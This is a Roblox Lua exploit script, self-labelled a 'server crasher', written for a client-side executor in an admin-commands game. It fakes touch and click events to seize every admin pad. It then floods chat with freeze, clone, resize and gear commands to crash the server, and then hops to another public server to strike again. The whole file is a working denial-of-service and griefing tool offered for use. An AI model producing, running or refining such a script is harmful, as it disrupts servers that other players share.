-- Server crasher script made by Korabi#8910






-- Touch this = I bite u
local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin
local plyrs = game:GetService("Players")
local rns = game:GetService("RunService")





--[[
Settings; Change anything youd like here but make sure that it is of the right type.
]]--

local name = "Kohl Smasher"
function scExecuted()
    local r = false;
local logs = game:GetService("LogService"):GetLogHistory()
for i, v in pairs(logs) do 
if table.find({"Access Granted", "ran", "API"}, v.message) then
r = true;
return true;
end
end
return r
end

function kill(msg)
    warn(msg)
    script.Source = ""
    a:KILL()
end


function hop(time)
if not time then time = 0 end
task.wait(time)
local httpres = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .."/servers/Public?sortOrder=Asc&limit=100")
httpres = game:GetService("HttpService"):JSONDecode(httpres)
local servers = httpres.data
if not servers then warn("Servers couldnt be fetched") end
for i, server in pairs(servers) do 
    if server.id ~= game.JobId and server.playing ~= server.maxPlayers and server.ping > 0 then
        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, server.id, game:GetService("Players").LocalPlayer)
    end 
end
end


function chat(msg)
    game:GetService("Players"):Chat(msg)
end


function notif(title, msg, duration)
if not msg then msg = "" end
if not title then title = "What the fuck??" end
if not duration then duration = 10 end
local options = {
Title = title,
Text = msg,
Duration = duration,
}
game:GetService("StarterGui"):SetCore("SendNotification", options)
end

function freezeCrash()
    for i = 1, 20 do
        chat("size all .3")
        end
        chat("freeze all")
        for i = 1, 20 do
        chat("size all 10")
        end
        chat("clone all")
        for i = 1, 20 do
        chat("size all 9")
        end
        for i = 1, 20 do
        chat("size all 10")
        end
        for i = 1, 20 do
        chat("freeze all")
        end
        for i =1, 20 do
        chat("clone all")
        end
           if not hopped then
           hop(10)
           hopped = true;  
           end
end

--[[
function grab()
    while task.wait() do
    coroutine.wrap(function() 
            local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
            for i, pad in pairs(pads) do
                coroutine.wrap(function()
                    pcall(function()
                        local cre = pad.Head
                        local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                        firetouchinterest(cre, spr, 0)
                        task.wait()
                        firetouchinterest(cre, spr, 1)
                        
                        if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                            fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                        end
                    end)
                end)()
        end
    end)()
    end
    end
]]--
function grab()
    local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
    for i, pad in pairs(pads) do
        coroutine.wrap(function()
            pcall(function()
                local cre = pad.Head
                local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                firetouchinterest(cre, spr, 0)
                task.wait()
                firetouchinterest(cre, spr, 1)
                
                if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                    fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                end
            end)
        end)()
end

function vampCrash()
    local i = 0;
    while i <= 5 do 
        chat("gear me 94794847")
        i = i + 1
    end
    task.wait(1)
    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
                if v:IsA("Tool") then
                     game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v)
                end
    end
    task.wait(0.2)
        --[[
        while task.wait() do 
            chat("size me 0000000000000000000.3")
        end]]--
    while game.Players.LocalPlayer.Character:FindFirstChild("VampireVanquisher") do 
        task.wait()
        chat("size me 0000000000000000000.3")
    end
 while not game.Players.LocalPlayer.Character:FindFirstChild("VampireVanquisher") do 
            task.wait()
      chat("gear me 94794847")
    end
end
for i, v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
    Spawn(function()
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Character
            end
        end)
    while game.Players.LocalPlayer.Character:FindFirstChild("VampireVanquisher") do 
        task.wait()
        chat("size me 0000000000000000000.3")
    end
end
end
notif(name.. " Loaded.")
grab()
vampCrash()
hop(5)

